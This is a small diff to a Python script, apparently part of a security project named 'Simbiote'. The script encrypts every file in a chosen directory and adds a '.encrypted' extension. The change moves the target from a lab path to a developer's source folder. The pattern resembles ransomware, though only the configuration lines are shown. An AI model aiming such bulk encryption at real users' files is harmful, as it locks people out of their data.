@@ -37,7 +37,7 @@ def encrypt_file(file_path, key, encrypted_extension='.encrypted'):
 
 if __name__ == "__main__":
     # Especifica el directorio que quieres cifrar
-    directorio_a_cifrar = r"/mnt/lab"
+    directorio_a_cifrar = r"D:\dev\proyectos\ciberseguridad\Simbiote\src"
     
     # Generar una clave de cifrado
     key = generate_key()
